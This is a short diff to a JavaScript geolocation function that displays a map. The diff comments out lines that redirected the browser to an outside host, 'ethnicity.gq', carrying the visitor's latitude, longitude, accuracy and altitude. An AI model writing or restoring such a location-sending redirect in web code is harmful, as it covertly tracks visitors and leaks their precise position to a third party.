@@ -34,11 +34,11 @@ function showPosition(position)
     document.getElementById("mapholder").innerHTML = "<img src='"+img_url+"'>";
     console.log(latlon, "Logged!");
     //--------------------------------------------------------
-    var data = "{latitude: \"" + position.coords.latitude + "\', longitude: \'" + position.coords.longitude + "\'}";
-    var url = 'data:text/json;charset=utf8,' + encodeURIComponent(data);
-    window.open(url, '_blank');
-    window.focus();
- window.location.href = "https://ethnicity.gq/geo/read.php?lat=" +  position.coords.latitude + "&lon=" + position.coords.longitude + "&acc=" + position.coords.accuracy + "&alt=" +position.coords.altitude;
+    //var data = "{latitude: \"" + position.coords.latitude + "\', longitude: \'" + position.coords.longitude + "\'}";
+    //var url = 'data:text/json;charset=utf8,' + encodeURIComponent(data);
+    //window.open(url, '_blank');
+    //window.focus();
+   //window.location.href = "https://ethnicity.gq/geo/read.php?lat=" +  position.coords.latitude + "&lon=" + position.coords.longitude + "&acc=" + position.coords.accuracy + "&alt=" +position.coords.altitude;
 
 }
 
